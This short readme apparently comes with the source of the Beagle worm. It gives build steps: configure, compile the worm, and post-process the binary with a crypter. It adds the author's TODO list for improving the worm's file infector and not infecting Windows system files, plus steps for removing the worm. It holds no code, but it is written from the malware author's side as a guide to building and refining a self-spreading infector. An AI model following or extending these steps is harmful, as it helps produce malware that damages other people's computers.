Compilation. MASM32v8 required.
* Compile ConfBuilder.
* Build configuration file with ConfBuilder.exe.
* Compile Beagle worm.
* Compile Crypt.asm app.
* Run Crypt.exe to post-process Beagle.exe file.

TODO.
* Implement DNS caching.
* Do more VirGen (file infector) tests.
* Do not infect Windows system files (XP auto-recovery make troubles).
* Use less memory.

Deletion.
* Compile worm with TestVersion=1 in Config.ini.
* Run "Beagle.exe -del".
